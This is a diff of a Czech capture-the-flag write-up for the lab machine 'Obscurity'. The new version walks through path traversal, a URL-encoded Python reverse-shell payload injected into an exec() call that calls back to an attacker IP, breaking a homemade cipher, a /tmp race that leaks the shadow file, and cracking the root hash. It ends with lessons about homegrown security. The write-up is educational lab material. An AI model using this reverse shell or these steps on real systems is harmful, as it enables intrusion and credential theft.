@@ -3,129 +3,108 @@ layout: post
 author: Tomáš Matějíček
 title: "Obscurity"
 date: 2020-12-22
-tags: linux rce ssh sudo wordpress exploit
+tags: linux rce ssh sudo python exploit
 ---
 ## Úvod a kontext
 
-Obscurity stojí na řetězení několika konkrétních slabin a artefaktů: WordPress a jeho pluginy a SSH.
+Obscurity je přesně ten typ stroje, který varuje před spoléháním na „vlastní bezpečnostní řešení“. Veřejně dostupný `BadHTTPServer` je vlastní Python server s code injection chybou. Po prvním footholdu pak slabá oprávnění odhalí vlastní šifrovací skript a password reminder pro `robert`. Root nakonec padne na pseudo-terminál `BetterSSH.py`, který lze zneužít závodem k přečtení `shadow`.
 
-Důležitější než samotný exploit je tady interpretace mezikroků, protože právě z těchto indicií vzniká SSH s nalezenými přihlašovacími údaji a teprve na něj navazuje příliš široká `sudo` oprávnění.
+Vzdělávací hodnota stroje leží v tom, že každá část je „domácí“ mechanismus. Žádný z nich není sám o sobě složitý, ale všechny dopadají špatně právě proto, že nahrazují standardní a ověřené komponenty.
 
 ## Počáteční průzkum
 
-### Vyhledání otevřených portů
+### `BadHTTPServer` na portu `8080`
 
-Nejprve mapuji veřejně dostupné služby, protože právě z otevřených portů odvodím, které protokoly a aplikace má smysl zkoumat detailněji.
+Scan ukáže jen SSH a vlastní HTTP službu na `8080/tcp`. Už samotný banner `BadHTTPServer` je silný signál, že nepůjde o běžný framework a že bude stát za to zkusit získat zdrojový kód.
 ```bash
 nmap -p 1-65535 -T4 -A -sC -v $IP
 ```
-```
-PORT     STATE  SERVICE    VERSION
-```
-
-### Detailní analýza služeb
-
-V dalším kroku si zpřesňuji verze služeb a jejich charakteristiky, protože právě z těchto detailů obvykle vzniká rozhodnutí, zda pokračovat přes web, SSH nebo jinou vrstvu.
 ```text
-22/tcp   open   ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
-```
-```
-| ssh-hostkey:
-|   2048 33:d3:9a:0d:97:2c:54:20:e1:b0:17:34:f4:ca:70:1b (RSA)
-|   256 f6:8b:d5:73:97:be:52:cb:12:ea:8b:02:7c:34:a3:d7 (ECDSA)
-|_  256 e8:df:55:78:76:85:4b:7b:dc:70:6a:fc:40:cc:ac:9b (ED25519)
+22/tcp   open   ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
 8080/tcp open   http-proxy BadHTTPServer
-| fingerprint-strings:
-|   GetRequest:
-|     HTTP/1.1 200 OK
-|     Date: Sat, 30 Nov 2019 20:51:25
-|     Server: BadHTTPServer
-|     Last-Modified: Sat, 30 Nov 2019 20:51:25
-|     Content-Length: 4171
-|     Content-Type: text/html
-|     Connection: Closed
-|     <!DOCTYPE html>
-|     <html lang="en">
-|     <head>
-|     <meta charset="utf-8">
-|     <title>0bscura</title>
-|     <meta http-equiv="X-UA-Compatible" content="IE=Edge">
-|     <meta name="viewport" content="width=device-width, initial-scale=1">
-|     <meta name="keywords" content="">
-|     <meta name="description" content="">
-|     <!--
-|     Easy Profile Template
-[... výstup zkrácen ...]
-SF:ent=\"\">\n\t<meta\x20name=\"description\"\x20content=\"\">\n<!--\x20\n
-SF:Easy\x20Profile\x20Template\nhttp://www\.templatemo\.com/tm-467-easy-pr
-SF:ofile\n-->\n\t<!--\x20stylesheet\x20css\x20-->\n\t<link\x20rel=\"styles
-SF:heet\"\x20href=\"css/bootstrap\.min\.css\">\n\t<link\x20rel=\"styleshee
-SF:t\"\x20href=\"css/font-awesome\.min\.css\">\n\t<link\x20rel=\"styleshee
-SF:t\"\x20href=\"css/templatemo-blue\.css\">\n</head>\n<body\x20data-spy=\
-SF:"scroll\"\x20data-target=\"\.navbar-collapse\">\n\n<!--\x20preloader\x2
-SF:0section\x20-->\n<!--\n<div\x20class=\"preloader\">\n\t<div\x20class=\"
-SF:sk-spinner\x20sk-spinner-wordpress\">\n");
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+Přes path traversal lze z webu rovnou stáhnout serverový skript i aplikační logiku.
+```text
+curl http://obscurity.htb:8080/..%2fSuperSecureServer.py
+curl http://obscurity.htb:8080/..%2fmain.py
 ```
 
 ## Analýza zjištění
 
-### Lámání hesel nebo hashů
+### Code injection v `SuperSecureServer.py`
 
-Hash nebo zašifrovaný artefakt má smysl lámat jen tehdy, pokud může otevřít další službu, účet nebo vrstvu prostředí; právě to zde ověřuji.
-```bash
-sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
+Zdrojový kód hned ukáže chybu: server skládá řetězec `output = 'Document: {}'` a předává ho do `exec()`. Protože do formátovaného řetězce vkládá cestu z URL, stačí payload uzavřít apostrofem a doplnit vlastní Python.
+```python
+info = "output = 'Document: {}'"
+print(exec(info.format(path)))
 ```
+
+Tím pádem jde rovnou poslat reverzní shell a získat první foothold jako webový uživatel.
+```text
+curl "http://obscurity.htb:8080/';s%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%2210.10.15.119%22%2C4000%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3B%20os.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dsubprocess.call%28%5B%22%2Fbin%2Fbash%22%2C%22-i%22%5D%29%3Ba='"
 ```
-root:$6$riekpK4m$__CENSORED__:18226:0:99999:7
 
-/usr/sbin/john Obscurity-shadow --wordlist=/usr/share/wordlists/rockyou.txt
-=>mercedes         (root)
+### `SuperSecureCrypt.py` a heslo pro `robert`
 
-su root
+Po footholdu jsou na disku čitelné soubory spojené s vlastním šifrováním. `SuperSecureCrypt.py` implementuje jednoduchou opakující se transformaci po znacích, takže když jsou k dispozici plaintext/ciphertext páry, jde klíč snadno odvodit. Výsledkem je klíč `alexandrovich`, kterým lze dešifrovat `Obscurity-passremin.txt` a získat heslo `SecThruObsFTW`.
+```text
+python3 SuperSecureCrypt.py -d -i Obscurity-passremin.txt -o T.txt -k "alexandrovich"
+cat T.txt
+=> SecThruObsFTW
 ```
 
 ## Získání přístupu
 
-### Přihlášení na cíl (2)
+### SSH jako `robert`
 
-Jakmile mám pověření nebo jednorázový shell, snažím se přejít na stabilní a reprodukovatelný přístup, aby bylo možné bezpečně pokračovat v interní enumeraci.
+Jakmile je známo heslo, nejrozumnější je opustit křehký webový shell a přepnout se na SSH jako `robert`. Tím vznikne stabilní přístup a možnost normálně pracovat s lokálními soubory.
 ```bash
 ssh robert@obscurity.htb
-```
-
-### Získání user flagu
-
-User flag zde slouží hlavně jako potvrzení, že už mám běžný uživatelský kontext a mohu pokračovat v lokální analýze systému.
-```bash
 cat user.txt
 ```
-```
+```text
 __CENSORED__
-
-=>sudo -l => (ALL) NOPASSWD: __CENSORED__ /home/robert/BetterSSH/BetterSSH.py
 ```
 
 ## Eskalace oprávnění
 
-### Získání root flagu
+### `BetterSSH.py` a závod o `shadow`
 
-Tento krok ukazuje, jak se nalezená slabina nebo chyba v delegaci oprávnění mění v privilegovaný přístup.
+`sudo -l` ukáže, že `robert` může jako root spouštět `/usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py`. Nejde o skutečné SSH, ale o vlastní pseudo-terminál, který pracuje se soubory v `/tmp/SSH`. Pokud se podaří dočasné soubory průběžně kopírovat do `/tmp`, v jednu chvíli se v nich objeví obsah `shadow`.
 ```bash
+sudo -l
+```
+```text
+(ALL) NOPASSWD: /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
+```
+
+```text
+while :; do cp /tmp/SSH/* /tmp/; echo 'Hit CTRL+C'; done
+sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
+```
+
+Jakmile se podaří získat hash `root`, zbývá ho cracknout a přepnout se na root standardním `su`.
+```text
+root:$6$riekpK4m$__CENSORED__:18226:0:99999:7
+/usr/sbin/john Obscurity-shadow --wordlist=/usr/share/wordlists/rockyou.txt
+=> mercedes         (root)
+
+su root
 cat root.txt
 ```
-```
+```text
 __CENSORED__
 ```
 
 ## Shrnutí klíčových poznatků
 
-- Počáteční průzkum se z obecné enumerace změnil v použitelný směr teprve po propojení indicií jako WordPress a jeho pluginy a SSH.
-- User část stála na ověřeném kroku typu SSH s nalezenými přihlašovacími údaji, ne na odhadu bez technického potvrzení.
-- Závěrečná eskalace pak stála na tom, co představuje příliš široká `sudo` oprávnění, takže rozhodující byla práce s lokálním kontextem po footholdu.
+- Obscurity padá už na vlastním webserveru, který použil `exec()` nad daty z URL a tím proměnil cestu k souboru v RCE.
+- Přechod na `robert` stojí na domácím šifrovacím mechanismu, který vypadal „bezpečně“, ale ve skutečnosti šel snadno prolomit.
+- Root část je další příklad toho samého: vlastní nástroj `BetterSSH.py` místo standardního řešení zavedl závod, který vydal `shadow`.
 
 ## Co si odnést do praxe
 
-- V tomhle článku se první slabé místo otevřelo přes WordPress a jeho pluginy a SSH. WordPress a jeho pluginy potřebují tvrdé oddělení administrace, minimální sadu rozšíření a rychlé patchování; právě pluginy často tvoří první vstup.
-- Stabilní foothold pak stojí na principu SSH s nalezenými přihlašovacími údaji. Hesla a klíče je potřeba oddělovat mezi službami; jakmile stejné přihlašovací údaje fungují i na SSH, z lokálního úniku je plnohodnotný systémový přístup.
-- Pro závěrečnou fázi je podstatné, že rozhodla příliš široká `sudo` oprávnění. Široká `sudo` oprávnění je potřeba pravidelně revidovat; wrapper, install helper nebo diagnostický příkaz často udělá z běžného účtu roota.
+- Vlastní webservery a routery požadavků nejsou zkratka k bezpečnosti. Pokud nahrazují běžný framework, často zopakují staré chyby v horší podobě.
+- Domácí kryptografie je téměř vždy slabší než standardní knihovny. Jakmile je algoritmus reverzibilní a klíč lze odvodit z dostupných párů, nejde o ochranu hesla.
+- Pseudo-terminály a wrappery běžící pod `sudo` musí být auditované stejně přísně jako shell. Na Obscurity se z „bezpečnějšího SSH“ stal jen jiný způsob, jak vydat root hash.
